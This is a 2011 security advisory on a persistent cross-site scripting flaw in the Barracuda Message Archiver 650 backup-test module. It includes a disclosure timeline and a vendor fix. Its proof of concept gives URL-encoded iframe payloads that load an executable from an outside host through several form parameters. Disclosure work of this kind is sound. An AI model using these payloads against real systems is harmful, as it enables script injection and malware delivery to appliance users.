Title:
======
Barracuda Archiver 650 - Input Validation Vulnerability


Date:
=====
2011-11-04


References:
===========
Barracuda Message Archiver 650 - v2.3.0.r114245 & older versions


VL-ID:
=====
34


Introduction:
=============
The Barracuda Message Archiver is a complete and affordable email archiving solution, enabling you to effectively 
index and preserve all emails, enhance operational efficiencies and enforce policies for regulatory compliance. By 
leveraging standard policies and seamless access to messages, email content is fully indexed and backed up to enable 
administrators, auditors and end users quick retrieval of any email message stored in an organization’s email archive.

    * Comprehensive archiving
    * Exchange stubbing
    * Search and retrieval
    * Policy management
    * Intelligent Storage Manager
    * Roles-based interface
    * Reporting and statistics

The Barracuda Message Archiver provides everything an organization needs to comply with government regulations in an 
easy to install and administer plug-and-play hardware solution. The Barracuda Message Archiver stores and indexes all 
email for easy search and retrieval by both regular users and third-party auditors. Backed by Energize Updates, delivered 
by Barracuda Central, the Barracuda Message Archiver receives automatic updates to its extensive library of virus, policy 
definitions to enable enhanced monitoring of compliance and corporate guidelines, document file format updates needed to 
decode content within email attachments, as well as security updates for the underlying Barracuda Message Archiver platform 
to protect against any potential security vulnerabilities.

(Copy of the Vendor Homepage: http://www.barracudanetworks.com/)


Abstract:
=========
Vulnerability-lab Team discovered multiple Input Validation Vulnerabilities on Barracudas - Message Archiver 650 (Appliance).


Report-Timeline:
================
2011-05-09:	Vendor Notification
2011-06-02:	Vendor Response/Feedback
2011-09-01:	Vendor Fix/Patch
2011-11-04:	Public or Non-Public Disclosure


Status:
========
Published


Affected Products:
==================
Barracuda Archiver 650 


Exploitation-Technique:
=======================
Remote


Severity:
=========
Medium


Details:
========
A persistent Input Validation vulnerability is detected on Barracudas Message Archiver 650 . Local low privileged user account can
implement/inject malicious persistent script code. When exploited by an authenticated user, the identified vulnerability 
can lead to information disclosure, access to intranet available servers, manipulated persistent content.

Vulnerable Module(s):
						[+] Configuration Backup => Backup Test


Picture(s):
						../ive1.png
						../ive2.png


Proof of Concept:
=================
The vulnerabilities can be exploited by low privileged user accounts or remote via high user inter-action.

Manually reproduce ...
1. Login
2. Switch to the vulnerable  module of the application
3. Include your own script code. Save! 
4. Enjoy the persistent output results

Server:		archiver.barracuda.com
File:		index.cgi
Para:		?&primary_tab=ADVANCED&secondary_tab=test_backup_server&content_only=1&&&backup_port=21&&backup_username= ... &&backup_password=

References(URL):
http://archiver.xxx.com/cgi-mod/index.cgi?&primary_tab=ADVANCED&secondary_tab=test_backup_server&content_only=1&&&backup_port=21&&backup_username=%3E%
22%3Ciframe%20src%3Dhttp%3A//vulnerability-lab.com/etc/bad-example.exe%20width%3D800%20height%3D800%3E&&backup_type=ftp&&backup_life=5&&backup_server=%3E%
22%3Ciframe%20src%3Dhttp%3A//vulnerability-lab.com/etc/bad-example.exe%20width%3D800%20height%3D800%3E&&backup_path=%3E%22%3Ciframe%20src%3Dhttp%3A//global-
evolution.info/etc/bad-example.exe%20width%3D800%20height%3D800%3E&&backup_password=%3E%22%3Ciframe%20src%3Dhttp%3A//vulnerability-lab.com/etc/bad-
example.exe%20width%3D800%20height%3D800%3E&&user=guest&&password=164ddc8feaa60cb4263cd93279e2c114&&et=1261213168&&locale=en_US


Source Review:
<input type="hidden" name="popup_url" value="/cgi-mod/index.cgi?
&primary_tab=ADVANCED&secondary_tab=test_backup_server&content_only=1&&&backup_port=21&&backup_username=%3E%22%3Ciframe%20src%3Dhttp%3A//vulnerability-lab.com/etc/bad-example.exe%20width%3D800%20height%3D800%3E&&backup_type=ftp&&backup_life=5&&backup_server=%3E%22%3Ciframe%20src%3Dhttp%3A//vulnerability-lab.com/etc/bad-example.exe%20width%3D800%20height%3D800%3E&&backup_path=%3E%22%3Ciframe%20src%3Dhttp%3A//vulnerability-lab.com/etc/bad-example.exe%
20width%3D800%20height%3D800%3E&&backup_password=%3E%22%3Ciframe%20src%3Dhttp%3A//vulnerability-lab.com/etc/bad-example.exe%20width%3D800%20height%3D800%
3E&&user=guest&&password=164ddc8feaa60cb4263cd93279e2c114&&et=1261213168&&locale=en_US"><table id="main_table" summary="Main Table" border="0" 
cellspacing="0" cellpadding="0" width="100%"><tr><td valign="top" bgcolor="#ffffff" nowrap="nowrap"><table summary="Top Row" cellspacing=0 cellpadding=0 
border=0 width=100%><tr><td align=left width=200>



Solution:
=========
2011-09-01:	Vendor Fix/Patch


Risk:
=====
The security risk of the discovered persistent vulnerability is estimated as medium(-).


Credits:
========
Vulnerability Research Laboratory -  Benjamin Kunz Mejri (Rem0ve)


Disclaimer:
===========
The information provided in this advisory is provided  as it is without any warranty. Vulnerability-Lab disclaims all warranties, 
either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
may not apply. Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability-
Lab. Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of 
other media, are reserved by Vulnerability-Lab or its suppliers.

    						Copyright © 2011|Vulnerability-Lab




-- 
Website: www.vulnerability-lab.com ; vuln-lab.com or vuln-db.com
Contact: admin@vulnerability-lab.com or support@vulnerability-lab.com

